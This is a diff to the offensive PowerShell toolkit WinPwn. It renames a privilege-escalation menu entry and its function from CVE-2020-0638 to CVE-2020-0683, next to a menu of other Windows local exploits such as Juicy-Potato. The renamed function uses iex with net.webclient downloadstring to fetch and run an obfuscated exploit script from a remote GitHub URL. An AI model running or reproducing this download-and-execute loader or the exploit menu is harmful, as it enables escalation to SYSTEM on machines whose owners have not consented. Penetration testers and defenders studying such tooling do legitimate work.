@@ -552,7 +552,7 @@ __        ___       ____
         Write-Host -ForegroundColor Green '6. CVE-2019-1069 - Polarbear Hardlink, Credentials needed - June 2019! '
         Write-Host -ForegroundColor Green '7. CVE-2019-1129/1130 - Race Condition, multiples cores needed - July 2019! '
 	Write-Host -ForegroundColor Green '8. CVE-2019-1215 - September 2019 - x64 only! '
-	Write-Host -ForegroundColor Green '9. CVE-2020-0638 - February 2020 - x64 only! '
+	Write-Host -ForegroundColor Green '9. CVE-2020-0683 - February 2020 - x64 only! '
         Write-Host -ForegroundColor Green '10. Juicy-Potato Exploit from SeImpersonate or SeAssignPrimaryToken to SYSTEM!'
         Write-Host -ForegroundColor Green '11. Exit. '
         Write-Host "================ WinPwn ================"
@@ -568,7 +568,7 @@ __        ___       ____
              6{cve-2019-1069}
              7{CVE-2019-1129}
 	     8{CVE-2019-1215}
-	     9{CVE-2020-0638}
+	     9{CVE-2020-0683}
              10{juicypot}
        }
     }
@@ -584,11 +584,11 @@ function testtemp
  }
 }
 
-function CVE-2020-0638
+function CVE-2020-0683
 {
     if ([Environment]::Is64BitProcess)
     {
-        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/cve-2020-0638.ps1')
+        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/cve-2020-0683.ps1')
     }
     else
     {
